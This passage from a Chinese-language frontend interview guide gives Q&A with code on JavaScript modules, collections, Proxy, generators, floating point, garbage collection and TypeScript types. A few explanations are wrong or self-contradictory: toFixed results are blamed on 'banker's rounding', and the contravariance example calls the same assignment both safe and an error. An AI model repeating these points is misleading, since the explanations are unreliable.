// 导入的是原始值的副本，模块内变化不影响已导入的值
// 解决：导出 getter 函数
// module.exports = { get count() { return count } }

// ===== ESM (ES Module，静态) =====
// 导出
// moduleB.js
export let count = 0
export const addCount = () => { count++ }
export default function defaultFn() {}
// 或集中导出
export { count, addCount }

// 导入
// main.js
import defaultFn, { count, addCount } from './moduleB.js'
// ⭐ import 静态提升：无论写在哪，都在代码顶部先执行
console.log(count) // 0
addCount()
console.log(count) // 1  ← ESM 是动态绑定（引用）！

// ESM 是动态绑定（活绑定）
// 导入的是引用，模块内变化会影响导入方
```

#### 核心对比

| 特性 | CommonJS | ESM |
|------|----------|-----|
| 语法 | require/module.exports | import/export |
| 加载时机 | 运行时、动态 | 编译时、静态 |
| 加载方式 | 同步 | 异步 |
| 导出类型 | 值的拷贝 | 值的引用（动态绑定） |
| this 指向 | 当前模块 | undefined |
| 循环引用 | 可能得到不完整对象 | 正常工作（引用绑定） |
| Tree Shaking | ❌ 不支持 | ✅ 支持 |
| 顶层 await | ❌ | ✅ |
| 浏览器 | ❌（需打包） | ✅ 原生支持 |
| 动态导入 | require | import() |

```javascript
// ===== Tree Shaking 示例 =====
// math.js (ESM)
export const add = (a, b) => a + b
export const subtract = (a, b) => a - b
export const multiply = (a, b) => a * b

// main.js
import { add } from './math.js'
// 打包后只会包含 add，subtract 和 multiply 会被剔除
// 这是因为 ESM 是静态的，编译器可以分析出哪些导出被使用了

// ===== 循环引用 =====
// a.js
import { b } from './b.js'
export const a = 'a'
console.log('a.js:', b)

// b.js
import { a } from './a.js'
export const b = 'b'
console.log('b.js:', a)

// ESM: 正常输出（引用绑定，最终能拿到值）
// CommonJS: a.js 中的 b 可能是 undefined（执行时还没赋值）

// ===== 动态导入 =====
// 按需加载，返回 Promise
const module = await import('./heavy-module.js')
module.default()
// Webpack 会把它自动拆分 chunk
```

**面试要点：** 「值的拷贝 vs 动态引用」、「编译时静态分析 vs 运行时动态加载」、「Tree Shaking 基础」是三个核心区分点。

---

### 38. 解构赋值、展开运算符的使用与陷阱？

**⭐⭐⭐**

```javascript
// ===== 数组解构 =====
const [a, , b] = [1, 2, 3]       // a=1, b=3
const [x, ...rest] = [1, 2, 3, 4] // x=1, rest=[2,3,4]
const [c = 'default'] = []        // c='default'（默认值）

// 交换变量（无需临时变量）
let m = 1, n = 2
;[m, n] = [n, m]

// ===== 对象解构 =====
const user = { name: 'Alice', age: 25, city: 'Beijing' }
const { name, age } = user
const { name: userName } = user  // 重命名
const { city = 'Shanghai' } = user // 默认值
const { address: { street } = {} } = user // 深层解构 + 默认值防报错

// ===== 函数参数解构 =====
function createUser({ name, age = 18, email = '' }) {
  console.log(name, age, email)
}
createUser({ name: 'Bob' }) // 'Bob', 18, ''

// ===== 展开运算符 =====
// 数组展开
const arr1 = [1, 2, 3]
const arr2 = [4, 5, 6]
const combined = [...arr1, ...arr2] // [1,2,3,4,5,6]
const clone = [...arr1]              // 浅拷贝

// 对象展开
const obj1 = { a: 1, b: 2 }
const obj2 = { c: 3, b: 4 }
const merged = { ...obj1, ...obj2 } // { a:1, b:4, c:3 }（后者覆盖前者）

// ===== 常见陷阱 =====
// 1. undefined/null 解构报错
const { x: { y } } = { x: null }  // TypeError!

// 2. 只有第一层是浅拷贝
const nested = { a: { b: 1 } }
const cloned = { ...nested }
cloned.a.b = 2
console.log(nested.a.b) // 2 ← 被修改了！

// 3. 展开原型的属性（不会展开原型链）
const objWithProto = Object.create({ inherited: 'from proto' })
objWithProto.own = 'own property'
const spread = { ...objWithProto }
console.log(spread.inherited) // undefined（不展开原型链）
```

---

### 39. Map、Set、WeakMap、WeakSet 的用法与区别？

**⭐⭐⭐**

```javascript
// ===== Map: 键可以是任意类型 =====
const map = new Map()

// 任何类型都可作为键
map.set('string', 'value1')
map.set(42, 'value2')
map.set({ id: 1 }, 'value3')
map.set(Symbol('key'), 'value4')
map.set(NaN, 'value5') // NaN === NaN 是 false，但 Map 中视为相同键

// 常用方法
map.get('string')      // 'value1'
map.has(42)            // true
map.delete('string')    // true
map.size               // 4
map.clear()

// 遍历（保持插入顺序）
for (const [key, value] of map) { }
map.forEach((value, key) => { })
[...map.keys()]
[...map.values()]
[...map.entries()]

// Map vs Object
// 1. Map 的 key 可以是任意类型，Object 的 key 只能是 string 或 symbol
// 2. Map 有 size，Object 需 Object.keys().length
// 3. Map 保持插入顺序，Object 不一定（ES6 后有序但不依赖）
// 4. Map 可迭代，Object 不行
// 5. Map 性能更好（频繁增删场景）

// ===== Set: 唯一值集合 =====
const set = new Set([1, 2, 2, 3, 3, 3]) // Set(3) {1, 2, 3}

set.add(4)
set.has(2)       // true
set.delete(3)
set.size         // 3

// 数组去重
const unique = [...new Set(arr)]

// 交集、并集、差集
const setA = new Set([1, 2, 3, 4])
const setB = new Set([3, 4, 5, 6])

const intersection = new Set([...setA].filter(x => setB.has(x)))  // {3,4}
const union = new Set([...setA, ...setB])                          // {1,2,3,4,5,6}
const difference = new Set([...setA].filter(x => !setB.has(x)))   // {1,2}

// ===== WeakMap: key 必须是对象，弱引用 =====
const weakMap = new WeakMap()

let obj = { id: 1 }
weakMap.set(obj, 'metadata')

obj = null // 原始对象没有其他引用 → 被 GC 回收
// weakMap 中的条目也会被自动清除（弱引用）

// ⚠️ 不可遍历（迭代时对象可能被 GC）
// weakMap.keys()  ← 不存在！
// weakMap.size    ← 不存在！

// 典型用途：关联额外数据而不阻止 GC
const domData = new WeakMap()
const el = document.getElementById('btn')
domData.set(el, { clicks: 0 })
// 当 el 从 DOM 移除后，domData 中的关联数据也会被 GC

// ===== WeakSet: 只能存对象，弱引用 =====
const weakSet = new WeakSet()
// weakSet.add(1) // TypeError: Invalid value used in weak set

// 典型用途：标记对象
const visitedNodes = new WeakSet()
function hasVisited(node) {
  if (visitedNodes.has(node)) return true
  visitedNodes.add(node)
  return false
}
```

| 特性 | Map | WeakMap | Set | WeakSet |
|------|-----|---------|-----|---------|
| key 类型 | 任意 | 仅对象 | value 类型: 任意 | 仅对象 |
| 引用类型 | 强引用 | 弱引用 | 强引用 | 弱引用 |
| 可遍历 | ✅ | ❌ | ✅ | ❌ |
| size | ✅ | ❌ | ✅ | ❌ |
| GC 影响 | 阻止 GC | 不阻止 GC | 阻止 GC | 不阻止 GC |

**面试要点：** WeakMap 的核心价值是「不阻止垃圾回收」。经典场景：DOM 关联数据、私有属性存储。

---

### 40. Proxy 和 Reflect 的使用场景？

**⭐⭐⭐⭐ · 高频**

```javascript
// ===== Proxy: 代理对象，拦截基本操作 =====
// 13 种拦截器：get, set, has, deleteProperty, ownKeys, getOwnPropertyDescriptor,
//              defineProperty, preventExtensions, getPrototypeOf,
//              setPrototypeOf, isExtensible, apply, construct

// 场景 1: 响应式数据（Vue 3 的核心）
function reactive(target) {
  return new Proxy(target, {
    get(target, key, receiver) {
      console.log(`读取 ${String(key)}`)
      // track(target, key) // 依赖收集
      const result = Reflect.get(target, key, receiver)
      return typeof result === 'object' ? reactive(result) : result
    },
    set(target, key, value, receiver) {
      console.log(`设置 ${String(key)} = ${value}`)
      const success = Reflect.set(target, key, value, receiver)
      // trigger(target, key) // 派发更新
      return success
    }
  })
}

// 场景 2: 表单校验
function createValidator(schema) {
  return new Proxy({}, {
    set(target, key, value) {
      const validator = schema[key]
      if (validator && !validator(value)) {
        throw new Error(`验证失败: ${String(key)}`)
      }
      target[key] = value
      return true
    }
  })
}

const form = createValidator({
  age: (v) => v >= 18,
  email: (v) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)
})

form.age = 16 // Error: 验证失败: age
form.email = 'invalid' // Error: 验证失败: email

// 场景 3: 负索引数组（arr[-1] 访问最后一个元素）
function createArray(...items) {
  return new Proxy(items, {
    get(target, key) {
      let index = Number(key)
      if (index < 0) {
        index += target.length
      }
      return Reflect.get(target, String(index))
    }
  })
}

const arr = createArray('a', 'b', 'c')
console.log(arr[-1]) // 'c'

// 场景 4: 默认值
function withDefault(target, defaultValue) {
  return new Proxy(target, {
    get(target, key) {
      return Reflect.has(target, key) ? Reflect.get(target, key) : defaultValue
    }
  })
}

// ===== Reflect: 反射 API =====
// 将 Object 上的内部方法标准化为函数
// 与 Proxy 的拦截器一一对应，默认行为

// 替代 try-catch
// ❌ try { Object.defineProperty(obj, key, desc) } catch {}
// ✅ if (Reflect.defineProperty(obj, key, desc)) { /* success */ }

// Proxy 中使用 Reflect 确保行为正确
const proxy = new Proxy(obj, {
  get(target, key, receiver) {
    // 使用 receiver 确保原型链上的 getter 的 this 指向代理对象
    return Reflect.get(target, key, receiver)
  }
})

// Object vs Reflect
// Object.keys()     → Reflect.ownKeys()
// Object.defineProperty() → Reflect.defineProperty()
// delete obj.key    → Reflect.deleteProperty(obj, 'key')
// key in obj        → Reflect.has(obj, key)
```

**面试要点：** Proxy + Reflect 是 Vue 3 响应式的核心。Proxy 的 13 个拦截器不用全背，但 get/set/deleteProperty/has 要熟悉。

---



## 六、异步编程与事件循环

### 41. Generator 函数的使用场景？如何实现 async/await？

**⭐⭐⭐**

```javascript
// Generator 函数：可以暂停和恢复执行的函数
// 用 function* 定义，用 yield 暂停

function* simpleGenerator() {
  console.log('开始')
  const a = yield '第一个 yield'
  console.log('收到:', a)
  const b = yield '第二个 yield'
  console.log('收到:', b)
  return '完成'
}

const gen = simpleGenerator()
console.log(gen.next())        // { value: '第一个 yield', done: false }
console.log(gen.next('外部值1')) // { value: '第二个 yield', done: false }
// 输出: 收到: 外部值1
console.log(gen.next('外部值2')) // { value: '完成', done: true }
// 输出: 收到: 外部值2

// ===== 场景 1: 异步流程控制 =====
function fetchData() {
  return new Promise(resolve => setTimeout(() => resolve('data'), 1000))
}

function* flow() {
  const data = yield fetchData()
  console.log('获取到:', data)
}

// 手动执行
const gen2 = flow()
gen2.next().value.then(data => gen2.next(data))

// ===== 场景 2: 遍历器 =====
const obj = {
  values: [1, 2, 3],
  *[Symbol.iterator]() {
    for (const v of this.values) {
      yield v
    }
  }
}
for (const v of obj) {
  console.log(v) // 1, 2, 3
}

// ===== 场景 3: 惰性计算 =====
function* fibonacci() {
  let [prev, curr] = [0, 1]
  while (true) {
    yield curr
    ;[prev, curr] = [curr, prev + curr]
  }
}

const fib = fibonacci()
fib.next().value // 1
fib.next().value // 1
fib.next().value // 2
fib.next().value // 3
fib.next().value // 5

// ===== 场景 4: redux-saga 风格副作用管理 =====
// 用 Generator 让异步代码看起来像同步
function* saga() {
  try {
    const user = yield call(api.fetchUser)
    const posts = yield call(api.fetchPosts, user.id)
    yield put({ type: 'SUCCESS', posts })
  } catch (err) {
    yield put({ type: 'ERROR', err })
  }
}
```

**面试要点：** Generator 的核心是「可暂停的函数」。最重要的应用是它构成了 async/await 的基础。

---

### 42. 为什么 0.1 + 0.2 !== 0.3？如何解决？

**⭐⭐⭐**

```javascript
console.log(0.1 + 0.2) // 0.30000000000000004
console.log(0.1 + 0.2 === 0.3) // false

// 原因：JavaScript 使用 IEEE 754 双精度浮点数（64 位）
// 0.1 和 0.2 在二进制中是无限循环小数，截断后产生精度误差

// 0.1 的二进制：0.00011001100110011... (无限循环)
// 截断到 52 位尾数后不是精确的 0.1

// ===== 解决方案 =====
// 1. toFixed（小数位固定时）
const result = (0.1 + 0.2).toFixed(1) // '0.3'

// 2. 转为整数计算
const result2 = (0.1 * 10 + 0.2 * 10) / 10 // 0.3

// 3. Number.EPSILON（最小精度差）
function isEqual(a, b) {
  return Math.abs(a - b) < Number.EPSILON
}
isEqual(0.1 + 0.2, 0.3) // true

// 4. 使用 Big.js / Decimal.js 等库
// const result = new Decimal(0.1).add(0.2).toNumber() // 0.3

// ===== 更多浮点数陷阱 =====
0.1 + 0.7 === 0.8       // false (0.7999999999999999)
0.2 + 0.4 === 0.6       // true（侥幸等于）
1 - 0.9 === 0.1         // false (0.09999999999999998)
0.57 * 100              // 56.99999999999999
1.335.toFixed(2)        // '1.33' (而不是 '1.34'！)
// 正确做法：1.335.toPrecision(4) → '1.335'

// ⚠️ toFixed 的银行家舍入问题
(2.55).toFixed(1)  // '2.5' (银行家舍入：5 前偶则舍，奇则入)
(2.45).toFixed(1)  // '2.5'
```

**面试要点：** 必须说出 IEEE 754 和二进制表示截断这个根本原因。Number.EPSILON 比较方案最常用。

---

### 43. 如何实现一个微任务队列？（queueMicrotask）

**⭐⭐**

```javascript
// 微任务优先级高于宏任务
// 创建微任务的方式：

// 方式 1: queueMicrotask (推荐，浏览器原生)
queueMicrotask(() => {
  console.log('微任务执行')
})

// 方式 2: Promise
Promise.resolve().then(() => {
  console.log('微任务执行')
})

// 方式 3: MutationObserver
const observer = new MutationObserver(() => {
  console.log('微任务执行')
})
const textNode = document.createTextNode('0')
observer.observe(textNode, { characterData: true })
textNode.textContent = '1'

// ===== 执行顺序验证 =====
console.log('1: 同步')

setTimeout(() => console.log('3: 宏任务'), 0)

queueMicrotask(() => {
  console.log('2: 微任务')
  // 微任务中再次添加微任务
  queueMicrotask(() => console.log('2.1: 嵌套微任务'))
})

Promise.resolve().then(() => console.log('2.2: Promise 微任务'))

console.log('1.1: 同步')

// 输出：
// 1: 同步
// 1.1: 同步
// 2: 微任务
// 2.2: Promise 微任务
// 2.1: 嵌套微任务
// 3: 宏任务

// 关键：微任务队列必须完全清空，包括新添加的微任务！
// 这就是为什么嵌套微任务可能阻塞渲染
```

---

### 44. JavaScript 的垃圾回收机制（GC）是什么？

**⭐⭐⭐**

```javascript
// V8 使用分代回收：新生代 + 老生代

// ===== 新生代 (Scavenge 算法) =====
// 存活时间短的对象（大多数对象）
// 空间分为 From 和 To 两半
// 存活对象从 From 复制到 To，然后清空 From
// 存活多次后晋升到老生代

// ===== 老生代 (Mark-Sweep & Mark-Compact) =====
// 标记-清除 (Mark-Sweep)：
//   1. 从根对象（window/global）出发，标记所有可达对象
//   2. 清除未标记的对象

// 标记-整理 (Mark-Compact)：
//   清除后整理碎片空间

// ===== 两种常见的 GC 算法 =====
// 1. 引用计数（已废弃）
let obj1 = { data: 'some data' }
let obj2 = obj1
obj1 = null
obj2 = null
// 引用计数为 0 → 回收
// 缺陷：循环引用无法回收！

// 2. 标记-清除（V8 使用）
function createCycle() {
  const a = {}
  const b = {}
  a.ref = b
  b.ref = a
  return 'cycle created'
}
createCycle()
// a 和 b 互相引用，但都不在根可达路径上 → 被正确回收

// ===== 内存泄漏常见场景 =====
// 1. 意外的全局变量
function leak1() {
  bar = 'global variable' // 未声明变量 → 挂到 window 上
}

// 2. 被遗忘的定时器
let data = getLargeData()
setInterval(() => {
  console.log(data) // data 永远不被回收
}, 1000)
// 解决：clearInterval

// 3. 脱离 DOM 树但 JS 仍然引用
const elements = []
function leak3() {
  const el = document.getElementById('btn')
  el.parentNode.removeChild(el) // DOM 移除
  elements.push(el)               // 但 JS 还引用着 → 无法 GC
}

// 4. 闭包不当
function leak4() {
  const hugeData = new Array(10000000)
  window.addEventListener('click', () => {
    console.log(hugeData[0]) // 闭包持有 hugeData
  })
}
// 解决：清理事件监听器

// 5. 未清理的 Map/Set 强引用
// ✅ 改用 WeakMap / WeakSet 替代

// ===== Chrome DevTools 排查 =====
// 1. Performance: 录制 → 观察 JS Heap 曲线 → 如果持续上升可能是泄漏
// 2. Memory → Heap Snapshot: 对比两次快照 → 查看 Delta 增量
// 3. Memory → Allocation timeline: 记录分配时间线定位泄漏代码
```

**面试要点：** 说清楚标记-清除的基本原理（从根可达性分析）。内存泄漏场景至少要说出 3 个。

---

### 45. 什么是 WebAssembly？适合什么场景？

**⭐⭐**

```javascript
// WebAssembly (Wasm): 一种低级的类汇编语言，以二进制格式运行在浏览器中
// 特点：接近原生性能、类型化、安全沙箱

// ===== 使用方式 =====
// 1. 加载并编译 Wasm 模块
async function loadWasm() {
  const response = await fetch('module.wasm')
  const bytes = await response.arrayBuffer()
  const module = await WebAssembly.instantiate(bytes)
  const { add, fibonacci } = module.instance.exports
  console.log(add(1, 2))       // 3
  console.log(fibonacci(40))   // 瞬间完成
}

// 2. 流式编译（更快）
const { instance } = await WebAssembly.instantiateStreaming(
  fetch('module.wasm')
)

// ===== JS 和 Wasm 数据交互 =====
// Wasm 通过线性内存（ArrayBuffer）共享数据
const memory = new WebAssembly.Memory({ initial: 256, maximum: 256 })
// JS 写入数据 → Wasm 读取 → Wasm 处理 → JS 读取结果

// ===== 适用场景 =====
// ✅ 计算密集型（图像/视频处理、3D 渲染、游戏引擎）
// ✅ 加密/解密、压缩/解压
// ✅ 科学计算、模拟
// ✅ 代码复用（C/C++/Rust → Web）

// ❌ 不适合：DOM 操作（无法直接访问）
// ❌ 不适合：简单逻辑（初始化开销 > 收益）
// ❌ 不适合：快速原型（开发效率不如 JS）
```

---

### 46. for...of 和 for...in 的区别？

**⭐⭐⭐**

```javascript
const arr = ['a', 'b', 'c']
arr.foo = 'bar'

// for...in: 遍历可枚举属性（包括原型链 ← 不推荐用于数组）
for (const key in arr) {
  console.log(key) // '0', '1', '2', 'foo'
}

// for...of: 遍历可迭代对象的值（推荐用于数组/Map/Set/字符串）
for (const value of arr) {
  console.log(value) // 'a', 'b', 'c'
}

// ===== 对比 =====
const obj = { a: 1, b: 2, c: 3 }

// for...in: 遍历对象属性名
for (const key in obj) {
  if (obj.hasOwnProperty(key)) { // 过滤原型链属性
    console.log(key, obj[key])
  }
}

// for...of: 不能直接遍历普通对象（不是可迭代对象）
// for (const val of obj) {} // TypeError!

// 可用 Object.entries 实现
for (const [key, value] of Object.entries(obj)) {
  console.log(key, value)
}

// ===== 性能对比 =====
// for...of 通常比 for...in 快，因为：
// 1. for...in 需要遍历整个原型链
// 2. for...of 只迭代 [Symbol.iterator] 方法返回的值
```

---

### 47. 如何遍历对象属性的各种方式？

**⭐⭐**

```javascript
const sym = Symbol('sym')
const obj = Object.create(
  { inherited: 'from proto' }, // 原型属性
  {
    own: {
      value: 'own property',
      enumerable: true
    },
    hidden: {
      value: 'hidden property',
      enumerable: false
    }
  }
)
obj[sym] = 'symbol property'

// 1. for...in: 可枚举属性（包括原型链，不包括 Symbol）
for (const key in obj) {
  console.log(key) // 'own', 'inherited'
}

// 2. Object.keys: 自身可枚举属性（不包括原型和 Symbol）
console.log(Object.keys(obj)) // ['own']

// 3. Object.getOwnPropertyNames: 自身所有字符串属性（包括不可枚举，不包括 Symbol）
console.log(Object.getOwnPropertyNames(obj)) // ['own', 'hidden']

// 4. Object.getOwnPropertySymbols: 自身 Symbol 属性
console.log(Object.getOwnPropertySymbols(obj)) // [Symbol(sym)]

// 5. Reflect.ownKeys: 自身所有属性（字符串+Symbol，包括不可枚举）
console.log(Reflect.ownKeys(obj)) // ['own', 'hidden', Symbol(sym)]

// 6. Object.values / Object.entries: 自身可枚举属性的值/键值对
console.log(Object.values(obj))  // ['own property']
console.log(Object.entries(obj)) // [['own', 'own property']]

// ===== 对比表 =====
// 方法                    自有枚举 自有非枚举 Symbol 原型链
// for...in                ✅       ❌        ❌      ✅
// Object.keys             ✅       ❌        ❌      ❌
// Object.getOwnPropertyNames ✅    ✅        ❌      ❌
// Object.getOwnPropertySymbols ❌  ❌        ✅      ❌
// Reflect.ownKeys         ✅       ✅        ✅      ❌
```

---



## 七、TypeScript 核心

### 48. TypeScript 的类型系统有哪些核心概念？

**⭐⭐⭐⭐ · 高频**

```typescript
// ===== 基础类型 =====
let str: string = 'hello'
let num: number = 42
let bool: boolean = true
let arr: number[] = [1, 2, 3]
let arr2: Array<string> = ['a', 'b']
let tuple: [string, number] = ['age', 25]        // 元组
let any: any = 'anything'                          // 任意类型（逃生舱）
let unknown: unknown = 'could be anything'        // 安全版的 any
let never: never                                   // 永不返回（抛异常/死循环）
let voidType: void = undefined                     // 无返回值
let n: null = null
let u: undefined = undefined

// ===== unknown vs any =====
let a: any = 'hello'
a.toUpperCase()    // ❌ 无类型检查，运行时可能出错
a.nonExistent()    // ❌ 编译通过，运行报错

let b: unknown = 'hello'
// b.toUpperCase() // ❌ 编译错误！必须先类型收窄
if (typeof b === 'string') {
  b.toUpperCase()  // ✅ 安全
}

// ===== 联合类型 & 交叉类型 =====
type ID = string | number                    // 联合：或
let userId: ID = 123
userId = 'abc'

type Named = { name: string }
type Aged = { age: number }
type Person = Named & Aged                   // 交叉：且
const person: Person = { name: 'Alice', age: 25 }

// ===== 类型别名 vs 接口 =====
type Point = { x: number; y: number }         // 类型别名
interface IPoint { x: number; y: number }     // 接口

// 区别：
// 1. interface 可被重复声明（自动合并），type 不行
// 2. interface 可被 extends，type 用 & 交叉
// 3. type 支持联合/元组/映射类型，interface 不支持
// 推荐：对象结构用 interface，其他用 type

// ===== 泛型 =====
function identity<T>(arg: T): T {
  return arg
}
identity<string>('hello') // 显式指定
identity(42)              // 类型推导

// 泛型约束
function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
  return obj[key]
}
getProperty({ name: 'Alice', age: 25 }, 'name') // ✅
// getProperty({ name: 'Alice' }, 'age') // ❌ 编译错误！

// ===== 工具类型 =====
interface User {
  id: number
  name: string
  email: string
  age?: number
}

type ReadonlyUser = Readonly<User>              // 所有属性只读
type PartialUser = Partial<User>                // 所有属性可选
type RequiredUser = Required<User>              // 所有属性必选（-?）
type UserPreview = Pick<User, 'id' | 'name'>   // 选取部分属性
type UserWithoutEmail = Omit<User, 'email'>     // 排除部分属性
type Role = 'admin' | 'user' | 'guest'
type AdminRole = Exclude<Role, 'guest'>         // 排除类型 'admin' | 'user'
type NonNullableUser = NonNullable<string | null | undefined> // 排除 null/undefined
type UserRecord = Record<string, number>        // { [key: string]: number }
type UserFnParams = Parameters<(a: number, b: string) => void> // [number, string]
type ReturnString = ReturnType<() => string>     // string

// ===== 条件类型 & infer =====
type IsString<T> = T extends string ? 'yes' : 'no'
type A = IsString<string>  // 'yes'
type B = IsString<number>  // 'no'

// 提取数组元素类型
type ArrayItem<T> = T extends (infer U)[] ? U : never
type Item = ArrayItem<string[]> // string

// 提取函数返回类型
type MyReturnType<T> = T extends (...args: any[]) => infer R ? R : never
type FnReturn = MyReturnType<() => Promise<number>> // Promise<number>

// ===== 模板字面量类型 =====
type EventName<T extends string> = `on${Capitalize<T>}`
type ClickEvent = EventName<'click'> // 'onClick'
```

**面试要点：** any 和 unknown 的区别、interface 和 type 的区别、泛型和工具类型是高频考点。

---

### 49. TypeScript 的 enum 有什么问题？推荐用什么替代？

**⭐⭐**

```typescript
// ❌ enum 的问题
// 1. 编译后产生额外的 JS 代码（非零成本抽象）
enum Color {
  Red,    // 0
  Green,  // 1
  Blue    // 2
}
// 编译为：
// var Color;
// (function (Color) {
//   Color[Color["Red"] = 0] = "Red";
//   Color[Color["Green"] = 1] = "Green";
//   Color[Color["Blue"] = 2] = "Blue";
// })(Color || (Color = {}));
// 产生了 IIFE 和双向映射！

// 2. 值可以是 number，不安全
const color: Color = 999 // 编译通过！运行时 Color[999] 是 undefined

// 3. const enum 有跨项目问题
// const enum Status { Active, Inactive }
// 内联到使用处，但跨库导入时可能丢失

// ✅ 替代方案 1: 字符串字面量联合类型（推荐）
type Color2 = 'red' | 'green' | 'blue'
const color2: Color2 = 'red' // 类型安全！

// ✅ 替代方案 2: const 对象 + as const
const COLORS = {
  Red: '#FF0000',
  Green: '#00FF00',
  Blue: '#0000FF',
} as const

type ColorKey = keyof typeof COLORS  // 'Red' | 'Green' | 'Blue'
type ColorValue = typeof COLORS[ColorKey] // '#FF0000' | '#00FF00' | '#00FF00'

const getColor = (key: ColorKey): ColorValue => COLORS[key]
```

**面试要点：** enum 不是 JS 原生功能，有运行时开销。推荐用字符串联合类型或 `as const` 替代。

---

### 50. TypeScript 的类型体操：如何深度 Readonly / 深度 Partial？

**⭐⭐⭐**

```typescript
// ===== 深度 Readonly =====
type DeepReadonly<T> = {
  readonly [K in keyof T]: T[K] extends object
    ? T[K] extends Function
      ? T[K]  // 函数保持原样
      : DeepReadonly<T[K]>
    : T[K]
}

interface Config {
  server: {
    host: string
    port: number
  }
  database: {
    url: string
    pool: {
      min: number
      max: number
    }
  }
}

type ReadonlyConfig = DeepReadonly<Config>
// 所有层级都变为 readonly

// ===== 深度 Partial =====
type DeepPartial<T> = {
  [K in keyof T]?: T[K] extends object
    ? DeepPartial<T[K]>
    : T[K]
}

// ===== 深度 Required =====
type DeepRequired<T> = {
  [K in keyof T]-?: T[K] extends object
    ? DeepRequired<T[K]>
    : T[K]
}

// ===== is 类型谓词（类型收窄）=====
function isString(value: unknown): value is string {
  return typeof value === 'string'
}

const val: unknown = 'hello'
if (isString(val)) {
  val.toUpperCase() // val 被收窄为 string
}

// ===== satisfies 关键字（TS 4.9+）=====
const palette = {
  red: [255, 0, 0],
  green: '#00ff00',
  blue: [0, 0, 255],
} satisfies Record<string, string | number[]>

// palette.red 仍然推断为 number[] 而非 string | number[]
// 但整个对象满足 Record<string, string | number[]>
palette.red[0] = 128 // ✅ 类型安全

// ===== as const 断言 =====
const routes = {
  home: '/',
  about: '/about',
  user: '/user/:id',
} as const
// routes.home 的类型是 '/' 而不是 string
```

---

### 51. 如何在 TypeScript 中处理第三方库的类型？

**⭐⭐**

```typescript
// 1. 使用 @types 包
// npm install @types/lodash

// 2. 第三方提供了类型
import lodash from 'lodash' // lodash 自带 .d.ts

// 3. 声明模块（.d.ts 文件）
// types/global.d.ts
declare module 'my-legacy-lib' {
  export function doSomething(x: number): string
  export const version: string
}

// 4. 声明全局变量/函数
declare global {
  interface Window {
    __APP_VERSION__: string
    analytics: {
      track(event: string, data?: any): void
    }
  }
}

// 5. 扩展已有类型
// 扩展 Express Request
declare namespace Express {
  interface Request {
    user?: {
      id: number
      name: string
    }
  }
}

// 6. 非 TS 资源导入
declare module '*.svg' {
  const content: React.FunctionComponent<React.SVGAttributes<SVGElement>>
  export default content
}
declare module '*.css' {
  const content: Record<string, string>
  export default content
}
declare module '*.jpg' {
  const src: string
  export default src
}
```

---

### 52. 协变与逆变是什么？

**⭐⭐⭐**

```typescript
// 协变 (Covariance): 子类型可以赋值给父类型
class Animal {
  name: string = ''
}
class Dog extends Animal {
  breed: string = ''
}

let animals: Animal[] = [new Dog()] // ✅ 协变：Dog[] 是 Animal[] 的子类型

// 逆变 (Contravariance): 函数参数类型
type Handler<T> = (item: T) => void

let animalHandler: Handler<Animal> = (a: Animal) => {
  console.log(a.name)
}

// ❌ 直觉上 Dog 是 Animal 的子类，但...
// let dogHandler: Handler<Dog> = animalHandler // 严格模式下报错！
// 因为 dogHandler 可能传入 Dog 特有的属性，但 animalHandler 不认识

// ✅ 反过来则安全
// let dogHandler: Handler<Dog> = animalHandler // 严格模式下会报错

// 大多数情况不需要关心，但设计库时会用到
// 示例：Event Emitter 类型
interface EventMap {
  click: MouseEvent
  keydown: KeyboardEvent
}

class EventEmitter<Events extends Record<string, any>> {
  on<K extends keyof Events>(
    event: K,
    handler: (e: Events[K]) => void
  ): void {}
  // handler 是逆变位置
}
```

---

### 53. TypeScript 的 infer 关键字用法？

**⭐⭐**

```typescript
// infer: 在条件类型中推断类型变量

// 1. 提取函数返回类型
type MyReturnType<T> = T extends (...args: any[]) => infer R ? R : never

// 2. 提取数组元素类型
type ArrayElement<T> = T extends (infer U)[] ? U : never

// 3. 提取 Promise 值类型（递归）
type Awaited<T> = T extends Promise<infer U> ? Awaited<U> : T
type Result = Awaited<Promise<Promise<number>>> // number

// 4. 提取函数参数类型
type FirstParam<T> = T extends (first: infer P, ...args: any[]) => any ? P : never
type Param = FirstParam<(x: number, y: string) => void> // number

// 5. 提取 Promise.all 结果类型
type PromiseAll<T extends any[]> = T extends [infer First, ...infer Rest]
  ? [Awaited<First>, ...PromiseAll<Rest>]
  : []
type Promises = [Promise<string>, Promise<number>]
type Results = PromiseAll<Promises> // [string, number]
```

---

### 54. satisfies 和 as const 的使用场景？

**⭐⭐**

```typescript
// satisfies: 检查类型，但不改变推断结果
type Color = 'red' | 'green' | 'blue'

// ❌ 用类型注解：丢失具体值推断
const colors1: Record<string, Color> = {
  primary: 'red',
  secondary: 'green',
}
const r1 = colors1.primary // 类型是 Color，不是 'red'

// ✅ 用 satisfies：保留字面量类型
const colors2 = {
  primary: 'red',
  secondary: 'green',
} satisfies Record<string, Color>
const r2 = colors2.primary // 类型是 'red'！同时确保 key 是 string, value 是 Color

// as const: 将值锁定为字面量类型（readonly）
const config = {
  host: 'localhost',
  port: 3000,
} as const

// config.host 类型是 'localhost'（不是 string）
// config.port 类型是 3000（不是 number）
// config 整个对象是 readonly

// 实际应用：常量映射
const STATUS_MAP = {
  0: '未开始',
  1: '进行中',
  2: '已完成',
} as const

type Status = keyof typeof STATUS_MAP // 0 | 1 | 2
type StatusText = typeof STATUS_MAP[Status] // '未开始' | '进行中' | '已完成'
```

---



## 八、浏览器原理

### 55. 浏览器渲染流程（完整链路）？

**⭐⭐⭐⭐⭐ · 必问**

```
HTML ──Parse──▶ DOM Tree ──┐
                           ├──▶ Render Tree ──▶ Layout ──▶ Paint ──▶ Composite
CSS  ──Parse──▶ CSSOM Tree ┘      (渲染树)      (布局)     (绘制)    (合成)
JS   ──Execute─┐
               └── 可能修改 DOM/CSSOM，触发重排或重绘
```

```javascript
// ===== 详细步骤 =====
// 1. 构建 DOM 树
//    - HTML 解析器将字节 → 字符 → Token → 节点 → DOM 树
//    - CSS 不阻塞 DOM 解析
//    - JS 阻塞 DOM 解析（除非 async/defer）

// 2. 构建 CSSOM 树
//    - CSS 解析与 DOM 解析并行
//    - CSS 会阻塞渲染（Render Tree 需要 CSSOM）
//    - CSS 会阻塞 JS 执行（JS 可能查询样式）

// 3. 构建渲染树 (Render Tree)
//    - 合并 DOM + CSSOM，过滤掉不可见节点
//    - display: none 的节点不在渲染树中
//    - visibility: hidden 在渲染树中（占位置）

// 4. 布局 (Layout / Reflow)
//    - 计算每个节点的精确位置和大小
